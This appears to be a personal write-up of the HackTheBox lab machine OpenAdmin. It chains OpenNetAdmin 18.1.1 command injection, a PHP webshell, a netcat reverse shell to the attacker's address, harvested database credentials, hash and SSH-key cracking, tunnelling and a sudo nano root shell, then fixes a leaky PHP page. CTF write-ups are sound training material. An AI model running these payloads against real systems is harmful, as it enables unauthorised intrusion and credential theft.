---
title: HackTheBox - OpenAdmin
categories: [HackTheBox, HackTheBox - Linux]
date: 2022-09-26
tags: [linux-priv-esc/sudo/gtfo-bin, tcp/80-http/web-app-cms-exploit, pivot]
img_path: /Writeups/HackTheBox/Linux/OpenAdmin/images/
image:
  src: Pasted%20image%2020220925180337.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Overview 
This machine begins w/ a web enumeration, discovering that on  `OpenNetAdmin 1.18.1` is running, it is susceptible to a RCE exploit, allowing us to obtain a low-privilege/`www-data`
user.

For privilege escalation part, we have to privilege escalate to `jimmy`, `joanna` then to `root`.
After enumerating files in `/ona/` directory, `mysql` database credentials is revealed, allowing us to switch to user `jimmy`.

After enumerating the system w/ `linpeas.sh`, `jimmy` belongs to a group `internal` and has `RWX` access to `/var/www/internal`, `/var/www/internal` is being hosted as user `joanna` locally on port 52846, w/ `chisel` we are able to access it on `kali`. Since `jimmy` has write access to `/var/www/internal` directory, simply inserting a web shell and invoking a reverse shell through that will privilege escalate us to user `joanna`.

User `joanna` has a sudoers entry that allows `joanna` to execute `nano` as root. `nano` has a GTFOBins entry, allowing us to spawn a `root` shell.


---

| Column       | Details      |
| ------------ | ------------ |
| Box Name     | OpenAdmin    |
| IP           | 10.10.10.171 |
| Points       | 20           |
| Difficulty   | Easy         |
| Creator      |      [del_KZx497Ju](https://www.hackthebox.com/home/users/profile/82600)         |
| Release Date |    04 Jan 2020          |


# Recon

## TCP/80 (HTTP)
- FFUF
	```
	301      GET        9l       28w      314c http://10.10.10.171/artwork => http://10.10.10.171/artwork/
	200      GET      375l      964w    10918c http://10.10.10.171/index.html
	301      GET        9l       28w      312c http://10.10.10.171/music => http://10.10.10.171/music/
	403      GET        9l       28w      277c http://10.10.10.171/server-status
	```



# Initial Foothold

## TCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution
1. Found `OpenNetAdmin v18.1.1` running after clicking `Login` from `http://OpenAdmin.htb/music`
	![](Pasted%20image%2020220925220041.png)
2. Search exploits for `OpenNetAdmin v18.1.1`

	| Exploit Title                                                | Path                 |
	| ------------------------------------------------------------ | -------------------- |
	| OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | php/webapps/47772.rb |
	| OpenNetAdmin 18.1.1 - Remote Code Execution                  | php/webapps/47691.sh |
3. How does `OpenNetAdmin 18.1.1 - Remote Code Execution` - (`php/webapps/47691.sh`) work?
	1. 
4. Try `OpenNetAdmin v18.1.1 - Remote Code Execution` - (`php/webapps/47691.sh`)
	1. Exploit!
		```
		┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171]
		└─# sh 47691.sh http://openadmin.htb/ona/
		$ id;whoami
		uid=33(www-data) gid=33(www-data) groups=33(www-data)
		www-data
		$
		```
	2. The shell is unstable, could not upgrade shell to fully interactive tty.
	3. Create webshell
		```
		┌──(root💀kali)-[~/htb/OpenAdmin]
		└─# echo "<?php system(\$_GET['c']);?>" | tee webshell.php
		<?php system($_GET['c']);?>
		```
	4. Transfer webshell to `openadmin.htb`
		```
		┌──(root💀kali)-[~/htb/OpenAdmin]
		└─# nc -nvlp 4444 < webshell.php
		$ nc 10.10.14.14 4444 > webshell.php
		
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		Ncat: Connection from 10.10.10.171.
		Ncat: Connection from 10.10.10.171:53832.
		```
	5. Invoke reverse shell
		```
		┌──(root💀kali)-[~/htb/OpenAdmin]
		└─# curl "http://10.10.10.171/ona/webshell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.14%2044
		44%20%3E%2Ftmp%2Ff"
		```
5.  Demo - `OpenNetAdmin v18.1.1 - Remote Code Execution`
	![](WO4vY3wm5C.gif)


## TCP/80 (HTTP) - OpenNetAdmin v18.1.1 Remote Code Execution (Metasploit)
1. Launch `msfconsole`
2. Use `unix/webapp/opennetadmin_ping_cmd_injection`
3. Set `OPTIONS`
	```
	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set RHOSTS 10.10.10.171
	RHOSTS => 10.10.10.171
	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set LHOST tun0
	LHOST => 10.10.14.14
	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > set payload 8
	payload => linux/x64/meterpreter/reverse_tcp
	```
4. View `OPTIONS`
	```
	msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) > show options
	
	Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):
	
	   Name       Current Setting  Required  Description
	   ----       ---------------  --------  -----------
	   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
	   RHOSTS     10.10.10.171     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
	   RPORT      80               yes       The target port (TCP)
	   SSL        false            no        Negotiate SSL/TLS for outgoing connections
	   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
	   TARGETURI  /ona/login.php   yes       Base path
	   URIPATH                     no        The URI to use for this exploit (default is random)
	   VHOST                       no        HTTP server virtual host
	
	
	Payload options (linux/x64/meterpreter/reverse_tcp):
	
	   Name   Current Setting  Required  Description
	   ----   ---------------  --------  -----------
	   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
	   LPORT  4444             yes       The listen port
	
	
	Exploit target:
	
	   Id  Name
	   --  ----
	   0   Automatic Target
	```
5. Exploit!
	![](Pasted%20image%2020220926040313.png)



# Privilege Escalation

## Jimmy - Enumeration (Found Jimmy Creds)
1. Since we saw a login page earlier, there should be a database configuration file, enumerate the system for configuration files
	```
	www-data@openadmin:/opt/ona$ find . 2>/dev/null | grep config
	./www/config
	./www/config/auth_ldap.config.php
	./www/config/config.inc.php
	```
2. View `config.inc.php`
	```
	www-data@openadmin:/opt/ona$ cat ./www/config/config.inc.php | grep -n "db\|database"
	...
	176:$dbconffile = "{$base}/local/config/database_settings.inc.php";
	...
	```
	- Points to a file w/ database configuration
3. Found credentials at  `local/config/database_settings.inc.php`
	```php
	www-data@openadmin:/opt/ona$ cat www/local/config/database_settings.inc.php
	<?php
	
	$ona_contexts=array (
	  'DEFAULT' =>
	  array (
	    'databases' =>
	    array (
	      0 =>
	      array (
	        'db_type' => 'mysqli',
	        'db_host' => 'localhost',
	        'db_login' => 'ona_sys',
	        'db_passwd' => 'n1nj4W4rri0R!',
	        'db_database' => 'ona_default',
	        'db_debug' => false,
	      ),
	    ),
	    'description' => 'Default data context',
	    'context_color' => '#D3DBFF',
	  ),
	);
	
	?>
	```
	- `ona_sys:n1nj4W4rri0R!`
4. Switch to `jimmy` w/ `n1nj4W4rri0R!`
	```
	www-data@openadmin:/opt/ona$ su jimmy
	Password: n1nj4W4rri0R!
	jimmy@openadmin:/opt/ona$
	```

## Extract MySQL Database Hashes & Crack
1. Connect to `mysql` w/ `ona_sys:n1nj4W4rri0R!`
	```
	www-data@openadmin:/opt/ona$ mysql -u ona_sys -p
	Enter password:
	```
2. Extract hashes from `users` table from `ona` database
	```
	mysql > use ona_default
	mysql> SELECT username, password FROM users;
	+----------+----------------------------------+
	| username | password                         |
	+----------+----------------------------------+
	| guest    | 098f6bcd4621d373cade4e832627b4f6 |
	| admin    | 21232f297a57a5a743894a0e4a801fc3 |
	+----------+----------------------------------+
	```
3. Identify the hash
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# nth -f hash --no-banner
	
	098f6bcd4621d373cade4e832627b4f6
	
	Most Likely
	MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
	MD4, HC: 900 JtR: raw-md4
	NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
	Domain Cached Credentials, HC: 1100 JtR: mscach
	
	21232f297a57a5a743894a0e4a801fc3
	
	Most Likely
	MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
	MD4, HC: 900 JtR: raw-md4
	NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
	Domain Cached Credentials, HC: 1100 JtR: mscach
	```
	- `raw-md5`
4. Crack hash w/ `hashcat`
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt --show
	098f6bcd4621d373cade4e832627b4f6:test
	21232f297a57a5a743894a0e4a801fc3:admin
	```


## Joanna - Enumeration
1. View groups for user `admin`
	```
	jimmy@openadmin:/var/www/internal$ groups
	jimmy internal
	```
	- `internal`
2. Found something interesting w/ `linpeas.sh`
	![](Pasted%20image%2020220926011836.png)
	>  - An internal port `TCP/52846`
	 > - Virtual Host is running as user `joanna`, 
	 > - Virtual Host web root directory: `/var/www/internal`
	 > - Virtual Host is running on `TCP/52846`
	 > - User `jimmy` has write access to the web root directory.


## Joanna - How to privilege escalate w/ the info we have?
1. Analyzing the information we have
	1. Since Virtual Host is configured to run as user `joanna`, commands executed by the webserver will be executed as user `joanna`.
	2. User `jimmy` has write access to the web root directory `/var/www/internal`, this means we can write a web shell, and invoke a reverse shell through the webshell to obtain `joanna` shell.
	3. We have to use SSH Tunnel/Chisel in order to access `TCP/52846` on `kali`

## Joanna - Setup SSH Tunnel/Chisel 
1. Setup SSH Tunnel
	```
	┌──(root💀kali)-[~/htb/OpenAdmin]
	└─# ssh -L52846:127.0.0.1:52846 jimmy@openadmin.htb
	```
	> On `kali`, port 52846 is forwarded to `openadmin.htb` on port 52846
2. Enumerate `TCP/52846` on `kali`
	```
	┌──(root💀kali)-[~/htb/OpenAdmin]
	└─# nmap -sV -sC localhost -p52846
	PORT      STATE SERVICE VERSION
	52846/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	| http-cookie-flags:
	|   /:
	|     PHPSESSID:
	|_      httponly flag not set
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	|_http-title: Tutorialspoint.com
	```
3. OR use `chisel`
	-  `kali`
		```
		┌──(root💀kali)-[~/htb/OpenAdmin]
		└─# chisel server --reverse --port 1337
		2022/09/26 01:46:59 server: Reverse tunnelling enabled
		2022/09/26 01:46:59 server: Fingerprint tW7cYmw1k5JhH4eZ9m62QDga8zuBVNteoY4tiaxbFvY=
		2022/09/26 01:46:59 server: Listening on http://0.0.0.0:1337
		```
	- `openadmin.htb`
		```
		jimmy@openadmin:/tmp$ ./chisel client 10.10.14.14:1337 R:52846:127.0.0.1:52846 &
		```

## Joanna - Insert Webshell & Create joannabash
1. Insert webshell 
	```
	jimmy@openadmin:/var/www/internal$ echo "<?php system(\$_GET['c'])?>" | tee webshell.php
	<?php system($_GET['c'])?>
	```
2. Test if our webshell works
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# curl localhost:52846/webshell.php?c=id
	uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
	```
	![](Pasted%20image%2020220926015451.png)
3. Create a `joannabash`, bash w/ `joanna` setuid
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# curl "localhost:52846/webshell.php?c=cp+/bin/bash+./joannabash;chmod+4755+./joannabash;+ls+-la"
	total 2208
	drwxrwx--- 2 jimmy  internal    4096 Sep 25 17:57 .
	drwxr-xr-x 4 root   root        4096 Nov 22  2019 ..
	-rwxr-xr-x 1 joanna joanna   1113504 Sep 25 17:56 bash
	-rwxrwxr-x 1 jimmy  internal    3229 Nov 22  2019 index.php
	-rwsr-xr-x 1 joanna joanna   1113504 Sep 25 17:57 joannabash
	-rwxrwxr-x 1 jimmy  internal     185 Nov 23  2019 logout.php
	-rwxrwxr-x 1 jimmy  internal     339 Nov 23  2019 main.php
	-rw-r--r-- 1 joanna joanna         5 Sep 25 17:56 test
	-rw-r--r-- 1 joanna joanna         5 Sep 25 17:56 testing
	-rw-rw-r-- 1 jimmy  jimmy         27 Sep 25 17:52 webshell.php
	```
4. Execute `joannabash` to privilege escalate
	```
	jimmy@openadmin:/var/www/internal$ ./joannabash -p
	joannabash-4.4$ id;whoami
	uid=1000(jimmy) gid=1000(jimmy) euid=1001(joanna) groups=1000(jimmy),1002(internal)
	joanna
	```
5. Demo - Insert webshell & create `jonnabash` 
	![](suBh3On9h2.gif)
6. Found `joanna` encrytped SSH private key.
	```
	joannabash-4.4$ ls -la /home/joanna | grep .ssh
	drwx------ 2 joanna joanna 4096 Nov 23  2019 .ssh
	```
## Joanna - Crack SSH Private Key
1. Transfer `id_rsa` to `kali`
2. Convert it to john format
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# python ssh2john.py id_rsa > john_id_rsa
	```
3. Crack w/ `john`
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# john john_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt
	Using default input encoding: UTF-8
	Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
	Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
	Cost 2 (iteration count) is 1 for all loaded hashes
	Will run 2 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	bloodninjas      (id_rsa)
	```
4. SSH w/ `id_rsa` & `bloodninjas`
	```
	┌──(root💀kali)-[~/htb/OpenAdmin/10.10.10.171/loot]
	└─# sshpass -P "Enter passphrase" -p 'bloodninjas' ssh joanna@openadmin.htb -i id_rsa
	Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
	
	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage
	
	  System information as of Sun Sep 25 18:11:28 UTC 2022
	
	  System load:  0.0               Processes:             232
	  Usage of /:   33.8% of 7.81GB   Users logged in:       1
	  Memory usage: 23%               IP address for ens160: 10.10.10.171
	  Swap usage:   0%
	
	
	 * Canonical Livepatch is available for installation.
	   - Reduce system reboots and improve kernel security. Activate at:
	     https://ubuntu.com/livepatch
	
	39 packages can be updated.
	11 updates are security updates.
	
	Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
	
	
	Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
	```


##  Root - Enumeration
1. Check `joanna`'s sudo access
	```
	joanna@openadmin:~$ sudo -l
	Matching Defaults entries for joanna on openadmin:
	    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
	
	User joanna may run the following commands on openadmin:
	    (ALL) NOPASSWD: /bin/nano /opt/priv
	```
	- `/bin/nano` - has a [GTFOBins entry](https://gtfobins.github.io/gtfobins/nano/#sudo)



## Root - SUID/SUDO GTFOBINS
1. How do we exploit `nano`
	- If the `nano` is allowed to run as superuser by `sudo`, it does not drop the elevated privileges
	- We are able to spawn a `root` shell w/ `nano` shortcuts
2. Exploit `nano`
	1. Execute `sudo /bin/nano /opt/priv` 
	2. Type this
		```
		CTRL+R, CTRL+X 
		# Type
		reset; sh 1>&0 2>&0
		```
	3.  `root` shell obtained
		```
		Command to execute: reset; sh 1>&0 2>&0#
		#  Get Help         ^X Read File
		#  Cancel          M-F New Buffer
		# id;whoami
		uid=0(root) gid=0(root) groups=0(root)
		root
		```
3. Demo - `GTFOBins nano`
	![](dn6WAwGVBq.gif)


# Additional

## Joana - Login & Obtain SSH Private
1. Instead of inserting a webshell, we can login to `TCP/52846`, revealing `joanna` SSH private key
2. Since we have `RWX` on `/var/www/internal`, view  `index.php`
	```php
	jimmy@openadmin:/var/www/internal$ cat index.php | grep password
	         .form-signin input[type="password"] {
	            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
	              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
	                  $msg = 'Wrong username or password.';
	            <input type = "password" class = "form-control"
	               name = "password" required>
	```
	- Found hash
3. Crack Hash w/ [dcode](https://www.dcode.fr/sha512-hash)
	![](Pasted%20image%2020220926042206.png)
4. Login w/ `jimmy:Revealed`, `joanna`'s SSH private key is displayed
	![](Pasted%20image%2020220926042456.png)


## Fix main.php
1.  `main.php` is missing `die` command, if we were to `curl` `main.php`, SSH private key will still be displayed
	```
	jimmy@openadmin:~$ curl -s localhost:52846/main.php
	<pre>-----BEGIN RSA PRIVATE KEY-----
	Proc-Type: 4,ENCRYPTED
	DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
	
	kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
	ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
	ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
	6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
	ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
	y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
	9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
	piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
	/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
	40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
	fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
	9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
	X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
	S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
	FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
	Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
	RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
	uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
	1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
	XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
	yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
	+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
	qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
	z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
	K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
	-----END RSA PRIVATE KEY-----
	</pre><html>
	<h3>Don't forget your "ninja" password</h3>
	Click here to logout <a href="logout.php" tite = "Logout">Session
	</html>
	```
	>  This because `die` is not used to terminate the remaining code, after it checks whether username is set, it continues to execute `PHP` code.
2. Fix `main.php`
	```php
	<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); die; };
	# Open Admin Trusted
	# OpenAdmin
	$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
	echo "<pre>$output</pre>";
	?>
	<html>
	<h3>Don't forget your "ninja" password</h3>
	Click here to logout <a href="logout.php" tite = "Logout">Session
	</html>
	```
3. Now if we were to `curl` `main.php`, nothing is displayed.
	```
	jimmy@openadmin:~$ curl -s localhost:52846/main.php
	```
4. Add a valid cookie to view `main.php`
	```
	jimmy@openadmin:~$ curl -s localhost:52846/main.php -H "Cookie: PHPSESSID=27606qebvn7cqbmgua0r1323m1"
	<pre>-----BEGIN RSA PRIVATE KEY-----
	Proc-Type: 4,ENCRYPTED
	DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
	
	kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
	ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
	ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
	6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
	ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
	y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
	9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
	piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
	/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
	40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
	fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
	9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
	X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
	S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
	FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
	Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
	RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
	uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
	1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
	XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
	yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
	+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
	qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
	z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
	K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
	-----END RSA PRIVATE KEY-----
	</pre><html>
	<h3>Don't forget your "ninja" password</h3>
	Click here to logout <a href="logout.php" tite = "Logout">Session
	</html>
	```